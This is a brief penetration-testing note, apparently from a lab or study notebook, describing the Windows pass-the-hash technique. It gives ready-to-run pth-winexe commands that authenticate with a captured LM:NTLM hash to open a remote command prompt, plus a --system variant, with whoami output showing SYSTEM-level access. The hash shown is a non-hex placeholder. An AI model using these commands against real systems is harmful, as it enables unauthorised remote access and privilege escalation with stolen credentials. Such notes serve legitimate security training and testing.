- - -
Windows accepts **hashes** instead of passwords to authenticate to a number of services.

we can use a modified version of winexe, pth-winexe to spawn a command prompt using the admin user's hash.

> [! Note ] 
>  For this attack you need to have the user's hash as you want to log-in.

example hash : Administrator:500:asd87a48qfj32ra8753vvkjagqg4gg733ff7:cgegf89fqgfb3fg832gr8bfbof3bf00:::

```sh
pth-winexe -U 'userX%asd87a48qfj32ra8753vvkjagqg4gg733ff7:cgegf89fqgfb3fg832gr8bfbof3bf00' //target-ip cmd.exe
```

> [! Note ] 
> In the above command we have include the entire hash LM:NTLM both.

```cmd
# whoami
UserX
```


```sh
pth-winexe --system -U 'userX%asd87a48qfj32ra8753vvkjagqg4gg733ff7:cgegf89fqgfb3fg832gr8bfbof3bf00' //target-ip cmd.exe
```

```
# whoami
nt authority/system
```


- - -

